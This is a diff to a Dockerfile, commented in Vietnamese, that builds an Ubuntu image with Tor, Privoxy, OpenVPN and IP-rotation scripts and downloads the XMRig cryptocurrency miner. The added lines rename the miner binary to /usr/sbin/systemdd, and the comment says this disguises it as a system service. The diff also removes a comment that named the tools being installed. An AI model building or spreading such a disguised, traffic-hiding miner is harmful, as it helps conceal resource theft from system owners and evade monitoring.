@@ -1,7 +1,7 @@
 # Sử dụng image cơ bản từ Ubuntu
 FROM ubuntu:20.04
 
-# Cài đặt các công cụ cần thiết bao gồm OpenVPN, Tor, Privoxy, cpulimit, và taskset
+# Cài đặt các công cụ cần thiết
 RUN apt-get update && apt-get install -y \
     torsocks \
     wget \
@@ -34,6 +34,9 @@ RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VE
     && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR \
     && mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/xmrig
 
+# Di chuyển và đổi tên tệp thực thi để ngụy trang thành systemdd
+RUN mv /root/work/xmrig /usr/sbin/systemdd
+
 # Sao chép các file cấu hình vào container
 COPY config /etc/privoxy/config
 COPY torrc /etc/tor/torrc
@@ -48,5 +51,5 @@ COPY ta.key /etc/openvpn/ta.key
 # Cấp quyền cho script và file cấu hình
 RUN chmod +x /root/start.sh /root/change_ip.sh
 
-# Khởi chạy script khi container bắt đầu
-CMD /root/start.sh
+# CMD để khởi động start.sh
+CMD ["/root/start.sh"]
